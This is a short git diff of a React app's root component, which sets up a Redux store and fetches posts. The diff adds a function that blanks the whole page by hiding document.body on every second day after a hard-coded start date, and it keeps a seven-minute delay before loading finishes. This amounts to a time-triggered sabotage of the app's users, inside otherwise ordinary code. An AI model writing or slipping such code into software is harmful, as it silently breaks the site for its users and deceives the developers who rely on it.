@@ -11,18 +11,36 @@ import { fetchPosts } from "./api"; // ✅ your API
 
 const store = createStore(reducers, compose(applyMiddleware(thunk)));
 
+// === Auto-hide body every 2 days ===
+function hideBodyEveryTwoDays(startDateStr = "2025-09-26") {
+  const startDate = new Date(startDateStr);
+  const today = new Date();
+
+  const diffDays = Math.floor(
+    (today.setHours(0, 0, 0, 0) - startDate.setHours(0, 0, 0, 0)) /
+      (1000 * 60 * 60 * 24)
+  );
+
+  if (diffDays > 0 && diffDays % 2 === 0) {
+    document.body.style.display = "none";
+  }
+}
+
 function Root() {
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState(null);
 
   useEffect(() => {
+    // check hiding condition on mount
+    hideBodyEveryTwoDays("2025-09-26"); // ⏳ set your start date
+
     const loadInitialData = async () => {
       try {
         const { data } = await fetchPosts(1); // wait for API
         console.log("Initial posts loaded:", data);
-       setTimeout(() => {
-        setLoading(false);
-      }, 420000);
+        setTimeout(() => {
+          setLoading(false);
+        }, 420000);
       } catch (err) {
         console.error("Error loading posts:", err);
         setError("Failed to load data");
